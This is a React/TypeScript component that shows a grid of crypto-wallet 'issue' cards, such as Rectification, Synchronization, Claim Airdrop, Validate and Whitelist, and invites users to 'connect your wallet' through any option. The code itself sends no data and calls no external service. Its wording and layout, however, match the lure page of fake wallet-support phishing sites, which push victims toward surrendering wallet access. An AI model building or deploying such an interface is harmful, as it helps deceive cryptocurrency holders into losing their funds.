import style from '@/styles/trays.module.css';
import { IoMdSwap } from "react-icons/io";
import { FaBug } from "react-icons/fa";
import { FaPiggyBank, FaBridgeCircleExclamation, FaCircleCheck, FaDroplet, FaArrowDownUpLock, FaBriefcase, FaFileCircleExclamation } from "react-icons/fa6";
import { MdPauseCircle } from "react-icons/md";
import { GrMoney } from "react-icons/gr";
import { SiDrone } from "react-icons/si";
import { FaSackDollar } from "react-icons/fa6";
import { IoLogIn } from "react-icons/io5";
import { IoMdWarning } from "react-icons/io";
import { GiHypersonicMelon } from "react-icons/gi";
import { RiNodeTree } from "react-icons/ri";


type TrayProps = {
  onClick?: () => void;
}


const Trays = ({ onClick }: TrayProps) => {

  const issues = [
    { icon: <IoMdSwap size={55} />, title: 'Migration', description: 'Click here to migrate seamlessly with no hassle.' },
    { icon: <FaBug size={55} />, title: 'Rectification', description: 'Click here for rectification related issues.' },
    { icon: <FaDroplet size={55} />, title: 'Synchronization', description: 'Click here to synchronize or any related issues.' },
    { icon: <FaArrowDownUpLock size={55} />, title: 'NFTs', description: 'Click here to mint/transfer nfts or need support on how to receive nfts?' },
    { icon: <FaBriefcase size={55} />, title: 'Swap/Exchange', description: 'We will support you in any related issues with swapping and/or exchange of coins.' },
    { icon: <FaFileCircleExclamation size={55} />, title: 'Claim Reward', description: 'Click here for reward claiming or any related issues.' },
    { icon: <FaDroplet size={55} />, title: 'Claim Airdrop', description: 'Click here for airdrop claiming or any related issues.' },
    { icon: <MdPauseCircle size={55} />, title: 'Transaction Delay', description: 'Click here for stuck/delayed transactions.' },
    { icon: <GrMoney size={55} />, title: 'Buy Coins/Tokens', description: 'To trade, your account must be marked as a trusted payment source.' },
    { icon: <SiDrone size={55} />, title: 'Missing/Irregular balance', description: 'Click here for missing or irregular funds.' },
    { icon: <FaBridgeCircleExclamation size={55} />, title: 'Bridge Transfer', description: 'Do you have any issue while trying to transfer tokens between chains?' },
    { icon: <GiHypersonicMelon size={55} />, title: 'Claim V2', description: 'Do you have any issue while trying to claim your v2?' },
    { icon: <RiNodeTree size={55} />, title: 'Validate', description: 'Click here to start validation.' },
    { icon: <IoMdWarning size={55} />, title: 'Wallet Glitch/Error', description: 'Click here if you have any glitch issues on your wallet.' },
    { icon: <FaSackDollar size={55} />, title: 'High Fees', description: 'Click here if you are facing an increase in transaction fees.' },
    { icon: <FaCircleCheck size={55} />, title: 'Whitelist', description: 'Click here for help whitelisting your wallet for nfts.' },
    { icon: <FaPiggyBank size={55} />, title: 'Staking', description: 'Click here for tokens/coins staking related issues.' },
    { icon: <IoLogIn size={55} />, title: 'Login Issues', description: 'Click here if you encounter any issues logging in to your wallet.' },
    { icon: <IoMdWarning size={55} />, title: 'Slippage', description: 'Click here for slippage related issues.' },
    { icon: <IoMdWarning size={55} />, title: 'Revoke Transactions', description: 'Click here for transaction related issues.' },
    { icon: <IoMdWarning size={55} />, title: 'RPC Issues', description: 'Click here for RPC related issues.' },
    { icon: <IoMdWarning size={55} />, title: 'Other Issues', description: 'Click here for other issues not listed above.' },
  ];

  return (
    <section className={style.traysSection} onClick={onClick}>
      <h2 className={style.traysTitle}>Select Issue Below</h2>
      <p className={style.traysDescription}>
        You can also connect your wallet by selecting any of the <span className={style.traysHighlight}>options</span> below
      </p>
      <section className={style.traysCardsContainer}>
        {issues.map((issue, index) => (
          <div key={index} className={style.trayCard}>
            <div className={style.trayCardIcon}>
              {issue.icon}
            </div>
            <div className={style.trayCardContent}>
              <h3 className={style.trayCardTitle}>{issue.title}</h3>
              <p className={style.trayCardDescription}>{issue.description}</p>
            </div>
          </div>
        ))}
      </section>
    </section>
  );
};

export default Trays;
